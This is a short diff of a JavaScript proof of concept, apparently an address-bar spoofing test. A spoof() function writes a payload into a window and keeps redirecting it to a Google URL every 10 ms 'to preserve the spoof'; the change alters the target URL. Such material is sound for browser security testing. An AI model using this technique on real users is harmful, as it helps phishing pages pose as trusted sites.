@@ -15,7 +15,7 @@ function spoof() {
     win.document.write(payload);
     win.document.close();
     setInterval(function() {
-        win.location.replace("https://www.google.com/csi");
+        win.location.replace("https://www.google.com:1234");
     }, 10);  // Small interval to preserve the spoof
 }
 </script>
